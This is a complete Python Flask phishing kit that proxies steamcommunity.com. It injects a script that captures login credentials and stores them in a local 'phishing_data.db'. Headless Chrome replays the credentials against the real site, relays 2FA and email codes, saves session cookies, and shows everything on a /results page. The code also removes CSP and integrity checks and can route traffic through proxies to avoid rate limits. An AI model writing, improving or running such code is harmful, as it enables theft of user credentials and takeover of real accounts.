import requests
from flask import Flask, request, Response, redirect, render_template, url_for
from bs4 import BeautifulSoup
import os
import datetime
from urllib.parse import urlparse, urlunparse, parse_qsl, urljoin
import sqlite3
import json
import rsa
import base64
import time
import random
import string
import threading
# --- NEW: IMPORT UNDETECTED CHROME DRIVER ---
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

app = Flask(__name__)

# --- NEW: GLOBAL SESSION STORAGE ---
# This will hold active Selenium drivers for users in the middle of a 2FA/email flow.
# Key: credential_id, Value: driver instance
ACTIVE_SESSIONS = {}
# --- END NEW ---

# --- CONFIGURATION ---
# The real website we are cloning.
TARGET_HOST = "steamcommunity.com"
# The protocol to use (http:// or https://)
TARGET_PROTOCOL = "https://"
# --- NEW: PROXY FOR OUTGOING REQUESTS (OPTIONAL) ---
# If you are being rate-limited by the target, you can use a proxy.
# Example for an HTTP proxy: "http://user:pass@10.10.1.10:3128"
# Example for a SOCKS5 proxy: "socks5h://user:pass@host:port" (use socks5h for DNS resolution)
OUTGOING_PROXY = None # Set to use Tor Browser proxy by default. Set to None to disable.
# --- END NEW ---
# --- NEW: DATABASE CONFIGURATION ---
DB_FILE = "phishing_data.db"
KNOWN_HOSTS = ('steampowered.com', 'steamcommunity.com', 'steamstatic.com', 'akamaihd.net')


def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    # Initial table creation
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            cookies TEXT,
            tfa_code TEXT,
            email_auth_code TEXT
        )
    ''')
    
    # --- NEW: Add columns if they don't exist (for migration) ---
    print("[*] Checking database schema...")
    cursor.execute("PRAGMA table_info(credentials)")
    columns = [column[1] for column in cursor.fetchall()]
    
    if 'status' not in columns:
        print("[*] Migrating database: Adding 'status' column...")
        cursor.execute("ALTER TABLE credentials ADD COLUMN status TEXT")
    
    if 'status_message' not in columns:
        print("[*] Migrating database: Adding 'status_message' column...")
        cursor.execute("ALTER TABLE credentials ADD COLUMN status_message TEXT")
    # --- END NEW ---

    conn.commit()
    conn.close()
    print("[+] Database schema is up to date.")


def rewrite_links(content, response_headers, final_url):
    """
    This is the definitive and robust link-rewriting engine. It correctly
    handles all forms of URLs, including relative, absolute, and protocol-relative,
    to ensure all assets are proxied correctly.
    """
    print("\n[+] Starting link rewriting process...")
    content_type = response_headers.get('Content-Type', '')
    encoding = 'utf-8'
    if 'charset=' in content_type:
        encoding = content_type.split('charset=')[-1]
    
    soup = BeautifulSoup(content, 'html.parser', from_encoding=encoding)
    base_url = final_url
    print(f"[*] Base URL for rewriting is: {base_url}")

    # --- NEW: Remove security policies that block our proxy ---
    # Remove Content Security Policy meta tags
    for tag in soup.find_all('meta', attrs={'http-equiv': 'Content-Security-Policy'}):
        print("[+] Found and removed CSP meta tag.")
        tag.decompose()

    # Remove Subresource Integrity attributes from links and scripts
    for tag in soup.find_all(['link', 'script'], integrity=True):
        print(f"[+] Found and removed integrity attribute from <{tag.name}> tag.")
        del tag['integrity']
    # --- END NEW ---

    def rewrite_url(url_string):
        """A robust helper to rewrite a single URL."""
        if not url_string:
            return ""
        
        print(f"  - Analyzing URL: {url_string[:100]}{'...' if len(url_string) > 100 else ''}")

        if url_string.startswith(('data:', '#', 'mailto:', 'javascript:')):
            print("    -> Ignored (scheme)")
            return url_string

        absolute_url = urljoin(base_url, url_string)
        parsed_url = urlparse(absolute_url)
        
        is_known_host = any(parsed_url.netloc.endswith(host) for host in KNOWN_HOSTS)
        
        if is_known_host:
            scheme = parsed_url.scheme if parsed_url.scheme else 'https'
            query = '?' + parsed_url.query if parsed_url.query else ''
            rewritten_url = f"/proxy/{scheme}/{parsed_url.netloc}{parsed_url.path}{query}"
            print(f"    -> Rewritten to: {rewritten_url}")
            return rewritten_url
        else:
            print(f"    -> Ignored (not a known host: {parsed_url.netloc})")
            return absolute_url

    for attribute in ['href', 'src']:
        print(f"\n[*] Scanning for '{attribute}' attributes...")
        for tag in soup.find_all(attrs={attribute: True}):
            tag[attribute] = rewrite_url(tag[attribute])

    print("\n[*] Scanning for 'srcset' attributes...")
    for tag in soup.find_all(srcset=True):
        srcset_parts = tag['srcset'].split(',')
        rewritten_parts = []
        print(f"  - Analyzing srcset: {tag['srcset'][:100]}...")
        for part in srcset_parts:
            part = part.strip()
            url_and_descriptor = part.split()
            if url_and_descriptor:
                url = url_and_descriptor[0]
                descriptor = " ".join(url_and_descriptor[1:])
                rewritten_url = rewrite_url(url)
                rewritten_parts.append(f"{rewritten_url} {descriptor}" if descriptor else rewritten_url)
        tag['srcset'] = ", ".join(rewritten_parts)

    body = soup.find('body')
    if body:
        # --- NEW: ADVANCED SCRIPT INJECTION ---
        # This script intercepts form submissions, sends credentials to our server,
        # and then handles the server's response to ask for a 2FA code, email code,
        # or redirect as needed.
        injection_script = """
        // Use a flag to ensure the event listener is attached only once.
        if (!window.submissionListenerAttached) {
            document.addEventListener('submit', function(e) {
                const form = e.target;

                // Find username and password fields manually by type, which is more reliable.
                const usernameInput = form.querySelector('input[type="text"]');
                const passwordInput = form.querySelector('input[type="password"]');

                const username = usernameInput ? usernameInput.value : '';
                const password = passwordInput ? passwordInput.value : '';

                // If we can't find the credentials, do nothing and let the original page's
                // JavaScript handle the event (e.g., to show a "field required" error).
                if (!username || !password) {
                    console.log('Phishing script did not find credentials, allowing original submission.');
                    return;
                }

                // If we found credentials, stop the original submission to send them to our server.
                e.preventDefault();

                console.log('Intercepted credentials for user:', username);

                fetch('/submit_credentials', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ username: username, password: password })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        // NEW: Redirect to the authenticating page
                        window.location.href = data.redirect_url;
                    } else {
                        // Show login failed message (e.g., database error)
                        alert(data.error || 'An unexpected error occurred. Please try again.');
                    }
                })
                .catch(error => {
                    console.error('Error submitting credentials:', error);
                    alert('An error occurred. Please try again.');
                });
            }, true); // Use capture to intercept the event early
            window.submissionListenerAttached = true;
        }
        """
        script_tag = soup.new_tag("script")
        script_tag.string = injection_script
        body.append(script_tag)
        # --- END NEW ---

    print("[+] Link rewriting process finished.")
    return str(soup)


def save_selenium_cookies(credential_id, driver):
    """Retrieves cookies from a given Selenium driver and saves them to the DB."""
    if not driver:
        print(f"[!] Cannot save cookies: No driver provided for credential ID {credential_id}")
        return
        
    try:
        selenium_cookies = driver.get_cookies()
        cookies_str = json.dumps(selenium_cookies)
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE credentials SET cookies = ? WHERE id = ?",
            (cookies_str, credential_id)
        )
        conn.commit()
        conn.close()
        print(f"[+] Successfully saved session cookies from Selenium for credential ID {credential_id}")
    except Exception as e:
        print(f"[!] Database error saving Selenium cookies: {e}")


def run_selenium_login_flow(app, credential_id, username, password):
    """
    NEW: This function runs the entire Selenium login process in a background thread.
    It updates the database with the final status of the attempt.
    """
    with app.app_context():
        def update_status(status, message=None):
            """Helper to update the DB."""
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE credentials SET status = ?, status_message = ? WHERE id = ?",
                (status, message, credential_id)
            )
            conn.commit()
            conn.close()
            print(f"[+] Status for credential ID {credential_id} updated to: {status}")

        print(f"[*] [Thread-{credential_id}] Starting real-time login attempt with Selenium...")
        options = uc.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36')
        
        driver = None
        try:
            driver = uc.Chrome(options=options)
            print(f"[+] [Thread-{credential_id}] Headless Chrome driver initialized.")
            
            login_url = "https://steamcommunity.com/login/home/?goto="
            driver.get(login_url)

            time.sleep(3)
            
            wait = WebDriverWait(driver, 10)
            
            username_box = wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, 'input[type="text"]')))
            password_box = wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, 'input[type="password"]')))
            
            username_box.send_keys(username)
            password_box.send_keys(password)
            
            driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()

            time.sleep(3) 
            try:
                error_element = driver.find_element(By.CLASS_NAME, 'login_error_msg')
                if error_element and error_element.is_displayed():
                    error_message = error_element.text
                    update_status('failure', error_message)
                    return
            except:
                pass

            try:
                WebDriverWait(driver, 15).until(
                    EC.any_of(
                        EC.text_to_be_present_in_element((By.TAG_NAME, 'body'), 'confirm your sign in'),
                        EC.text_to_be_present_in_element((By.TAG_NAME, 'body'), 'Enter your authenticator code'),
                        EC.text_to_be_present_in_element((By.TAG_NAME, 'body'), 'Enter the code we sent to'),
                        EC.url_contains("store.steampowered.com/account/"),
                        EC.url_contains("steamcommunity.com/id/")
                    )
                )
            except TimeoutException:
                driver.save_screenshot('debug_screenshot_timeout.png')
                update_status('failure', 'Login timed out. Steam did not respond.')
                return

            page_source = driver.page_source.lower()

            # SCENARIO 1A: Mobile 2FA PUSH NOTIFICATION
            if 'confirm your sign in' in page_source:
                print(f"[+] [Thread-{credential_id}] SCENARIO 1A: Mobile 2FA Push Notification required. Waiting for approval...")
                # The status remains 'pending' while we wait for the user to approve on their device
                try:
                    WebDriverWait(driver, 60).until(
                        EC.any_of(
                            EC.url_contains("store.steampowered.com/account/"),
                            EC.url_contains("steamcommunity.com/id/"),
                            EC.presence_of_element_located((By.ID, "account_pulldown"))
                        )
                    )
                    save_selenium_cookies(credential_id, driver)
                    update_status('success')
                except TimeoutException:
                    driver.save_screenshot('debug_screenshot_push_timeout.png')
                    update_status('failure', 'Timed out waiting for you to approve the login on your mobile device.')

            # SCENARIO 1B: Mobile 2FA CODE ENTRY
            elif 'enter your authenticator code' in page_source:
                print(f"[+] [Thread-{credential_id}] SCENARIO 1B: Mobile 2FA Code Entry required.")
                driver.save_screenshot(f'debug_screenshot_2fa_entry.png')
                save_selenium_cookies(credential_id, driver)
                ACTIVE_SESSIONS[credential_id] = driver
                update_status('requires_tfa_code')
                # The driver is kept alive by ACTIVE_SESSIONS, so we don't quit it here.

            # SCENARIO 2: Email auth required.
            elif 'enter the code we sent to' in page_source:
                print(f"[+] [Thread-{credential_id}] SCENARIO 2: Email auth required.")
                email_domain = "your email provider"
                try:
                    email_hint = driver.find_element(By.CLASS_NAME, 'newaccount_email_header')
                    if email_hint and '@' in email_hint.text:
                        email_domain = email_hint.text.split('@')[1]
                except:
                    pass
                save_selenium_cookies(credential_id, driver) 
                ACTIVE_SESSIONS[credential_id] = driver
                update_status('requires_email_code', email_domain)
                # The driver is kept alive, don't quit.

            # SCENARIO 4: Login successful (no 2FA).
            elif "store.steampowered.com/account/" in driver.current_url or "steamcommunity.com/id/" in driver.current_url:
                print(f"[+] [Thread-{credential_id}] SCENARIO 4: Login successful without 2FA!")
                save_selenium_cookies(credential_id, driver)
                update_status('success')
            
            # Fallback
            else:
                driver.save_screenshot('debug_screenshot_error.png')
                update_status('failure', 'An unknown error occurred after login.')

        except Exception as e:
            print(f"[!] [Thread-{credential_id}] An unexpected {type(e).__name__} occurred: {e}")
            if driver:
                driver.save_screenshot('debug_screenshot_error.png')
            update_status('failure', 'A critical server error occurred.')
        finally:
            # If the session is not being kept alive for a code entry, quit the driver.
            if credential_id not in ACTIVE_SESSIONS and driver:
                driver.quit()
                print(f"[+] [Thread-{credential_id}] Cleaned up ephemeral session.")


@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    """
    This is the core of the phishing logic.
    It now starts the login process in a background thread and immediately
    returns a response to the user's browser.
    """
    username = None
    password = None
    
    raw_data = request.get_data(as_text=True)
    if raw_data:
        try:
            # Try to parse as JSON first, for our fetch request
            data = json.loads(raw_data)
            username = data.get('username')
            password = data.get('password')
        except json.JSONDecodeError:
            # Fallback for standard form submissions
            try:
                parsed_data = dict(parse_qsl(raw_data))
                username = parsed_data.get('username')
                password = parsed_data.get('password')
            except:
                pass
            
    if not username or not password:
        return Response(json.dumps({'success': False, 'error': 'Missing credentials'}), status=400, mimetype='application/json')

    credential_id = None
    try:
        cookies_str = json.dumps({"status": "pending_selenium"})
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO credentials (username, password, cookies, status) VALUES (?, ?, ?, ?)",
            (username, password, cookies_str, 'pending')
        )
        credential_id = cursor.lastrowid
        conn.commit()
        conn.close()
        print(f"[+] Credentials for user '{username}' captured. ID: {credential_id}. Starting background login.")
    except Exception as e:
        print(f"[!] Database Error: {e}")
        return Response(json.dumps({'success': False, 'error': 'DATABASE_ERROR'}), status=500, mimetype='application/json')
    
    # --- Start the Selenium process in the background ---
    thread = threading.Thread(target=run_selenium_login_flow, args=(app, credential_id, username, password))
    thread.daemon = True
    thread.start()
    
    # --- Immediately respond to the user, telling them to go to the waiting page ---
    return Response(json.dumps({'success': True, 'redirect_url': f'/authenticating/{credential_id}'}), status=200, mimetype='application/json')


@app.route('/authenticating/<int:credential_id>')
def authenticating(credential_id):
    """Renders the 'waiting for push approval' page."""
    return render_template('authenticating.html', credential_id=credential_id)

@app.route('/get_login_status/<int:credential_id>')
def get_login_status(credential_id):
    """The JS on the waiting page polls this to get the login status."""
    try:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT status, status_message FROM credentials WHERE id = ?", (credential_id,))
        cred = cursor.fetchone()
        conn.close()
        
        if not cred:
            return Response(json.dumps({'status': 'failure', 'message': 'Invalid session ID.'}), status=404, mimetype='application/json')

        response = {'status': cred['status']}
        
        if cred['status'] == 'success':
            response['redirect_url'] = f"{TARGET_PROTOCOL}{TARGET_HOST}"
        elif cred['status'] == 'requires_email_code':
            response['email_domain'] = cred['status_message']
        elif cred['status'] == 'failure':
            response['message'] = cred['status_message']

        return Response(json.dumps(response), status=200, mimetype='application/json')

    except Exception as e:
        print(f"[!] Error checking status for {credential_id}: {e}")
        return Response(json.dumps({'status': 'failure', 'message': 'Server error while checking status.'}), status=500, mimetype='application/json')


def close_session(credential_id):
    """Safely quits a Selenium driver and removes it from the active sessions."""
    if credential_id in ACTIVE_SESSIONS:
        try:
            driver = ACTIVE_SESSIONS.pop(credential_id) # Pop to avoid race conditions
            driver.quit()
            print(f"[+] Cleaned up session for credential ID: {credential_id}")
        except Exception as e:
            print(f"[!] Error while closing session for credential ID {credential_id}: {e}")


# --- NEW: ROUTES FOR 2FA CAPTURE ---
@app.route('/enter_2fa/<int:credential_id>', methods=['GET'])
def enter_2fa(credential_id):
    """Displays the page for entering the 2FA code."""
    return render_template('2fa.html', credential_id=credential_id)


@app.route('/submit_2fa', methods=['POST'])
def submit_2fa():
    """
    NEW: This function now validates the 2FA code in real-time.
    It takes the code from the user, submits it using the active Selenium session,
    and returns a JSON response indicating success or failure.
    """
    data = request.get_json()
    tfa_code = data.get('tfa_code')
    credential_id = data.get('credential_id')

    if not all([tfa_code, credential_id]):
        return Response(json.dumps({'success': False, 'error': 'Missing data.'}), status=400, mimetype='application/json')
    
    credential_id = int(credential_id)
    driver = ACTIVE_SESSIONS.get(credential_id)

    if not driver:
        return Response(json.dumps({'success': False, 'error': 'Your session has expired. Please log in again.'}), status=400, mimetype='application/json')

    # --- NEW: Check if login is already complete due to mobile push approval ---
    if "store.steampowered.com/account" in driver.current_url or "steamcommunity.com/id/" in driver.current_url:
        print("[+] Login was already completed (likely via mobile push approval). Success!")
        # On success, clean up the session
        close_session(credential_id)
        return Response(json.dumps({
            'success': True,
            'redirect_url': f"{TARGET_PROTOCOL}{TARGET_HOST}"
        }), status=200, mimetype='application/json')

    try:
        # --- NEW: Screenshot at the start of the process for debugging ---
        driver.save_screenshot('debug_screenshot_2fa_entry.png')
        print("[+] Saved screenshot of the initial 2FA page.")

        print(f"[*] Attempting to submit 2FA code for credential ID: {credential_id}")
        
        wait = WebDriverWait(driver, 15) # Increased wait time slightly for reliability
        
        # --- NEW: Handle the "Confirm on Mobile" screen ---
        try:
            print("[*] Checking for mobile confirmation screen...")
            # This waits up to 5 seconds for the "Enter a code instead" link.
            # Using a more robust XPath selector to find the element.
            enter_code_link = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Enter a code instead')]"))
            )
            print("[+] Mobile confirmation screen found. Clicking 'Enter a code instead'...")
            enter_code_link.click()
            print("[*] Waiting for code entry page to load after click...")
            time.sleep(2) # Give page time to transition
        except TimeoutException:
            print("[-] Did not find mobile confirmation screen, assuming direct code entry.")
            pass # This is fine, we're likely already on the code entry page.
        
        # --- Enter the 2FA code and submit ---
        print("[*] Waiting for 2FA page content to load...")
        wait.until(EC.text_to_be_present_in_element((By.TAG_NAME, 'body'), 'Enter your authenticator code'))

        print("[*] Finding 2FA input and submit button...")
        # Find by attributes for more robustness
        code_entry = driver.find_element(By.CSS_SELECTOR, 'input[type="text"][maxlength="5"]')
        code_entry.send_keys(tfa_code)
        
        submit_button = driver.find_element(By.CSS_SELECTOR, '#login_twofactorauth_button_dologin, button[type="submit"]')
        
        print("[*] Submitting 2FA form via JavaScript click...")
        driver.execute_script("arguments[0].click();", submit_button)
        
        # --- Wait for the result ---
        print("[*] 2FA code submitted. Waiting for Steam's response...")
        WebDriverWait(driver, 15).until(
            EC.any_of(
                EC.url_contains("store.steampowered.com/account/"), # Success
                EC.visibility_of_element_located((By.ID, 'error_display'))   # Failure
            )
        )
        
        # --- Check for success or failure ---
        if "store.steampowered.com/account" in driver.current_url:
            print("[+] 2FA Login successful!")
            # On success, clean up the session
            if credential_id in ACTIVE_SESSIONS:
                ACTIVE_SESSIONS[credential_id].quit()
                del ACTIVE_SESSIONS[credential_id]
                print(f"[+] Cleaned up successful session for credential ID: {credential_id}")
            return Response(json.dumps({
                'success': True, 
                'redirect_url': f"{TARGET_PROTOCOL}{TARGET_HOST}"
            }), status=200, mimetype='application/json')
        else:
            # On failure (e.g. wrong code), keep the session alive for another try
            error_element = driver.find_element(By.ID, 'error_display')
            error_message = error_element.text if error_element else "Invalid 2FA code."
            print(f"[-] 2FA login failed. Reason: {error_message}")
            return Response(json.dumps({'success': False, 'error': error_message}), status=401, mimetype='application/json')

    except TimeoutException:
        print(f"[!] Timeout waiting for response after 2FA submission for credential ID: {credential_id}")
        # --- NEW: Save screenshot for debugging ---
        if driver:
            screenshot_path = 'debug_screenshot_timeout.png'
            driver.save_screenshot(screenshot_path)
            print(f"[+] Saved screenshot of the timeout page to: {screenshot_path}")
        # On a major error, clean up the session
        if credential_id in ACTIVE_SESSIONS:
            ACTIVE_SESSIONS[credential_id].quit()
            del ACTIVE_SESSIONS[credential_id]
            print(f"[+] Cleaned up failed session for credential ID: {credential_id}")
        return Response(json.dumps({'success': False, 'error': 'The request to Steam timed out. Please try logging in again.'}), status=500, mimetype='application/json')
    except Exception as e:
        print(f"[!] An unexpected {type(e).__name__} occurred during 2FA submission: {e}")
        # On a major error, clean up the session
        if credential_id in ACTIVE_SESSIONS:
            ACTIVE_SESSIONS[credential_id].quit()
            del ACTIVE_SESSIONS[credential_id]
            print(f"[+] Cleaned up failed session for credential ID: {credential_id}")
        return Response(json.dumps({'success': False, 'error': 'An unexpected server error occurred.'}), status=500, mimetype='application/json')


# --- NEW: ROUTES FOR EMAIL AUTH ---
@app.route('/enter_email_auth/<int:credential_id>')
def enter_email_auth(credential_id):
    """Displays the page for entering the email auth code."""
    email_domain = request.args.get('email_domain', 'your email provider')
    return render_template('email_auth.html', credential_id=credential_id, email_domain=email_domain)

@app.route('/submit_email_auth', methods=['POST'])
def submit_email_auth():
    """
    NEW: This function now validates the email auth code in real-time.
    """
    data = request.get_json()
    email_code = data.get('email_code')
    credential_id = data.get('credential_id')

    if not all([email_code, credential_id]):
        return Response(json.dumps({'success': False, 'error': 'Missing data.'}), status=400, mimetype='application/json')

    credential_id = int(credential_id)
    driver = ACTIVE_SESSIONS.get(credential_id)

    if not driver:
        return Response(json.dumps({'success': False, 'error': 'Your session has expired. Please log in again.'}), status=400, mimetype='application/json')

    # --- NEW: Check if login is already complete ---
    if "store.steampowered.com/account" in driver.current_url or "steamcommunity.com/id/" in driver.current_url:
        print("[+] Login was already completed. Success!")
        # On success, clean up the session
        close_session(credential_id)
        return Response(json.dumps({
            'success': True,
            'redirect_url': f"{TARGET_PROTOCOL}{TARGET_HOST}"
        }), status=200, mimetype='application/json')

    try:
        print(f"[*] Attempting to submit email auth code for credential ID: {credential_id}")
        
        wait = WebDriverWait(driver, 10)

        # --- Enter the email code and submit ---
        print("[*] Waiting for email auth input field to be ready...")
        wait.until(EC.text_to_be_present_in_element((By.TAG_NAME, 'body'), 'Enter the code we sent to'))

        print("[*] Finding email auth input and submit button...")
        # Find by attributes for more robustness
        code_entry = driver.find_element(By.CSS_SELECTOR, 'input[type="text"][maxlength="5"]')
        code_entry.send_keys(email_code)

        print("[*] Waiting for email auth submit button to be clickable...")
        submit_button = driver.find_element(By.CSS_SELECTOR, '#login_twofactorauth_button_dologin, button[type="submit"]')

        print("[*] Submitting email auth form via JavaScript click...")
        driver.execute_script("arguments[0].click();", submit_button)

        # --- Wait for the result ---
        print("[*] Email code submitted. Waiting for Steam's response...")
        WebDriverWait(driver, 15).until(
            EC.any_of(
                EC.url_contains("store.steampowered.com/account/"), # Success
                EC.visibility_of_element_located((By.ID, 'error_display'))   # Failure
            )
        )

        # --- Check for success or failure ---
        if "store.steampowered.com/account" in driver.current_url:
            print("[+] Email Auth successful!")
            # On success, clean up the session
            if credential_id in ACTIVE_SESSIONS:
                ACTIVE_SESSIONS[credential_id].quit()
                del ACTIVE_SESSIONS[credential_id]
                print(f"[+] Cleaned up successful session for credential ID: {credential_id}")
            return Response(json.dumps({
                'success': True, 
                'redirect_url': f"{TARGET_PROTOCOL}{TARGET_HOST}"
            }), status=200, mimetype='application/json')
        else:
            error_element = driver.find_element(By.ID, 'error_display')
            error_message = error_element.text if error_element else "Invalid email code."
            print(f"[-] Email auth failed. Reason: {error_message}")
            return Response(json.dumps({'success': False, 'error': error_message}), status=401, mimetype='application/json')

    except TimeoutException:
        print(f"[!] Timeout waiting for response after email auth submission for credential ID: {credential_id}")
        # --- NEW: Save screenshot for debugging ---
        if driver:
            screenshot_path = 'debug_screenshot_email_timeout.png'
            driver.save_screenshot(screenshot_path)
            print(f"[+] Saved screenshot of the timeout page to: {screenshot_path}")
        # On a major error, clean up the session
        if credential_id in ACTIVE_SESSIONS:
            ACTIVE_SESSIONS[credential_id].quit()
            del ACTIVE_SESSIONS[credential_id]
            print(f"[+] Cleaned up failed session for credential ID: {credential_id}")
        return Response(json.dumps({'success': False, 'error': 'The request to Steam timed out. Please try logging in again.'}), status=500, mimetype='application/json')
    except Exception as e:
        print(f"[!] An unexpected {type(e).__name__} occurred during email auth submission: {e}")
        # On a major error, clean up the session
        if credential_id in ACTIVE_SESSIONS:
            ACTIVE_SESSIONS[credential_id].quit()
            del ACTIVE_SESSIONS[credential_id]
            print(f"[+] Cleaned up failed session for credential ID: {credential_id}")
        return Response(json.dumps({'success': False, 'error': 'An unexpected server error occurred.'}), status=500, mimetype='application/json')


@app.route('/results')
def results():
    # --- NEW: RESTORED PASSWORD PROTECTION ---
    password = request.args.get('password')
    if not password:
        return "<h1>ACCESS DENIED</h1><p>Please provide a password via the 'password' query parameter, e.g., /results?password=YOUR_PASSWORD</p>", 403

    if not os.path.exists('auth.txt'):
        return "<h1>ERROR</h1><p>auth.txt not found. Cannot verify password.</p>", 500

    with open('auth.txt', 'r') as f:
        valid_password = f.read().strip()
    if password != valid_password:
        return "<h1>ACCESS DENIED</h1><p>Incorrect password.</p>", 403
    # --- END NEW ---
    try:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        # Updated query to include new columns
        cursor.execute("SELECT id, timestamp, username, password, cookies, tfa_code, email_auth_code FROM credentials ORDER BY timestamp DESC")
        entries = cursor.fetchall()
        conn.close()
        return render_template('results.html', entries=entries)
    except Exception as e:
        return f"<h1>Error</h1><p>Could not retrieve results from database: {e}</p>", 500


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
    """
    This is the new single master proxy. It handles both the initial request
    and all subsequent asset requests, routing them to the correct origin server.
    """
    # --- NEW: Redirect common entry points to the full login page ---
    if path in ('', 'login', 'login/'):
        return redirect('/login/home/?goto=')
    # --- END NEW ---

    proxies = {'http': OUTGOING_PROXY, 'https': OUTGOING_PROXY} if OUTGOING_PROXY else None
    
    if path.startswith('proxy/'):
        # This is an asset request for a specific, encoded host.
        # Path format: proxy/<protocol>/<host>/<real_path>
        try:
            _, protocol, host, real_path = path.split('/', 3)
            # Reconstruct the original URL for the asset
            original_url = f"{protocol}://{host}/{real_path}"
            if request.query_string:
                original_url += "?" + request.query_string.decode('utf-8')
            
            print(f"[*] Proxying asset from: {original_url}")
            
            # Forward the request to the original asset host
            headers = {key: value for (key, value) in request.headers if key.lower() != 'host'}
            headers['Host'] = host
            
            resp = requests.request(
                method=request.method, url=original_url, headers=headers,
                data=request.get_data(), cookies=request.cookies,
                allow_redirects=True, stream=True, proxies=proxies
            )
            
            # --- MODIFIED: Remove security headers ---
            excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'content-security-policy']
            response_headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
            
            # Return the asset directly without modification
            return Response(resp.iter_content(chunk_size=1024), resp.status_code, response_headers)

        except Exception as e:
            print(f"[!] Asset Proxy Error: {e}")
            return "<h1>Proxy Error</h1><p>Could not fetch asset.</p>", 502

    else:
        # This is the initial request for an HTML page.
        target_url = f"{TARGET_PROTOCOL}{TARGET_HOST}/{path}"
        if request.query_string:
            target_url += "?" + request.query_string.decode('utf-8')
        
        print(f"[*] Proxying initial page: {target_url}")
    
        headers = {key: value for (key, value) in request.headers if key.lower() != 'host'}
        headers['Host'] = TARGET_HOST
    
        try:
            resp = requests.request(
                        method=request.method, url=target_url, headers=headers,
                        data=request.get_data(), cookies=request.cookies,
                        allow_redirects=True, stream=True, proxies=proxies
                    )
                
            final_url = resp.url
            # --- MODIFIED: Remove security headers ---
            excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'content-security-policy']
            response_headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
        
            content_type = resp.headers.get('Content-Type', '')
        
            if 'text/html' in content_type:
                # Rewrite links in the HTML and return
                content = rewrite_links(resp.content, resp.headers, final_url)
                return Response(content, resp.status_code, response_headers)
            else:
                # For non-HTML content (e.g., images on the first request), stream it
                return Response(resp.iter_content(chunk_size=1024), resp.status_code, response_headers)

        except requests.exceptions.ProxyError as e:
            print(f"[!!!] CRITICAL PROXY ERROR: Could not connect to the outgoing proxy.")
            print(f"[!!!] Please check that your proxy ({OUTGOING_PROXY}) is running and accessible.")
            print(f"[!!!] Details: {e}")
            # Return a user-friendly error page
            return "<h1>Proxy Connection Error</h1><p>The server could not connect to the required outgoing proxy. Please contact the administrator.</p>", 502

        except requests.exceptions.RequestException as e:
            print(f"[!] An error occurred during the request to the target: {e}")
            return "<h1>Request Error</h1><p>Could not fetch the page from the target server.</p>", 502


if __name__ == "__main__":
    init_db()
    # It's better to run with `flask run` for development,
    # but this is here for direct execution.
    app.run(debug=False, port=5000)